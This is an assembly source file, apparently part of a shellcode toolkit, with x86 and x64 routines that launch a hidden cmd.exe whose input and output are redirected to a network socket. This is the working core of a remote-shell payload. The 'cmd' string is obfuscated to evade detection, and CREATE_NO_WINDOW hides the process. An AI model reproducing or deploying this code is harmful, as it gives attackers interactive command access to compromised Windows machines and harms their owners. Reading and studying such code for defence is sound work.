; *********************************************************************
;
;   Copyright (C) 2014 Kevin Devine - @cmpxchg8
;
;   This program is free software: you can redistribute it and/or modify
;   it under the terms of the GNU General Public License as published by
;   the Free Software Foundation, either version 3 of the License, or
;   (at your option) any later version.
;
;   This program is distributed in the hope that it will be useful,
;   but WITHOUT ANY WARRANTY; without even the implied warranty of
;   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;   GNU General Public License for more details.
;
;   You should have received a copy of the GNU General Public License
;   along with this program.  If not, see <http://www.gnu.org/licenses/>.
;
; *********************************************************************

ifdef USE_X86

; #####################################################################
;
; spawn cmd.exe process with stdin,stdout,stderr redirected to socket
;
; in:  esi = pointer to len + buf
;      ebx = data + code section on stack
;      eax = socket handle
;
; out: none
;
; #####################################################################

cmd32 proc
    pushad
    cdq
    
    lea    edi, [ebx][x.@si]
    mov    esi, edi
    
    push   sizeof (STARTUPINFO) 
    pop    dword ptr [edi][STARTUPINFO.cb]
    inc    dword ptr [edi][STARTUPINFO.dwFlags+1]
    lea    edi, [edi][STARTUPINFO.hStdInput]
    stosd
    stosd
    stosd
    xchg   eax, ebp
    
    mov    edi, ebx
    
    ; store "cmd", 0
    mov    eax, not SWAP32 ("cmd") shr 8
    not    eax
    stosd
    
    push   esi       ; lpProcessInformation
    push   esi       ; lpStartupInfo
    push   edx       ; lpCurrentDirectory=NULL
    push   edx       ; lpEnvironment=NULL
    push   not CREATE_NO_WINDOW
    not    dword ptr[esp]  ; dwCreationFlags=CREATE_NO_WINDOW
    push   edi       ; bInheritHandles=TRUE
    push   edx       ; lpThreadAttributes=NULL
    push   edx       ; lpProcessAttributes=NULL
    push   ebx       ; lpCommandLine
    push   edx       ; lpApplicationName
    callx  @CreateProcessA
    neg    eax       ; eax = (eax == TRUE) ? -1 : 0
    jns    exit_cmd32
    
    ; WaitForSingleObject (pi.hProcess, INFINITE);
    push   eax                    ; INFINITE
    push   [ebx][x.@pi.hProcess]
    callx  @WaitForSingleObject
    
    ; CloseHandle (pi.hProcess);
    lodsd
    push   eax
    callx  @CloseHandle
    
    ; CloseHandle (pi.hThread);
    lodsd
    push   eax
    callx  @CloseHandle
    
exit_cmd32:
    popad
    ret
cmd32 endp

else

  ; #####################################################################
  ;
  ; Spawn cmd.exe with socket redirected to stdin, stdout, stderr
  ;
  ; #####################################################################
    cmd_stk struc
      hs                   HOME_SPACE           <>

      bInheritHandles      QWORD                 ?
      dwCreationFlags      QWORD                 ?
      lpEnvironment        LPVOID                ?
      lpCurrentDirectory   LPCTSTR               ?
      lpStartupInfo        LPSTARTUPINFO         ?
      lpProcessInformation LPPROCESS_INFORMATION ?
    cmd_stk ends

    CMD_STK_SIZE equ ((sizeof (cmd_stk) and -16) + 16) - 8
    
cmd64 proc uses rax rbp
    add    rsp, -CMD_STK_SIZE
    
    lea    rdi, [rbx][x.@si]
    
    cdq
    mov    dl, sizeof (STARTUPINFO)
    mov    dword ptr [rdi][STARTUPINFO.cb       ], edx
    inc    dword ptr [rdi][STARTUPINFO.dwFlags+1]
    lea    rdi, [rdi][STARTUPINFO.hStdInput     ]
    stosq                        ; @si.hStdInput =s;
    stosq                        ; @si.hStdOutput=s;
    stosq                        ; @si.hStdError =s;
    xchg   eax, ebp
    
    ; store "cmd", 0
    mov    eax, not SWAP32 ("cmd") shr 8
    not    eax
    mov    qword ptr[rbx], rax
    
    lea    rdi, [rsp][cmd_stk.bInheritHandles]
    stosq                        ; bInheritHandles=TRUE
    mov    eax, not CREATE_NO_WINDOW
    not    eax
    stosq                        ; dwCreationFlags=CREATE_NO_WINDOW
    xor    eax, eax
    stosq                        ; lpEnvironment=NULL
    stosq                        ; lpCurrentDirectory=NULL
    xchg   eax, ecx
    lea    rax, [rbx][x.@si]
    stosq                        ; lpStartupInfo=@si
    stosq                        ; lpProcessInformation=@si
    xor    r9, r9
    xor    r8, r8
    push   rbx
    pop    rdx
    callx  @CreateProcessA
    neg    eax
    jns    exit_cmd64
    
    ; WaitForSingleObject (pi.hProcess, INFINITE);
    xchg   eax, edx              ; INFINITE
    mov    rcx, [rbx][x.@pi.hProcess]
    callx  @WaitForSingleObject
    
    ; CloseHandle (pi.hProcess);
    mov    rcx, [rbx][x.@pi.hThread]
    callx  @CloseHandle
    
    ; CloseHandle (pi.hThread);
    mov    rcx, [rbx][x.@pi.hProcess]
    callx  @CloseHandle
exit_cmd64:
    sub    rsp, -CMD_STK_SIZE
    ret
cmd64 endp

endif
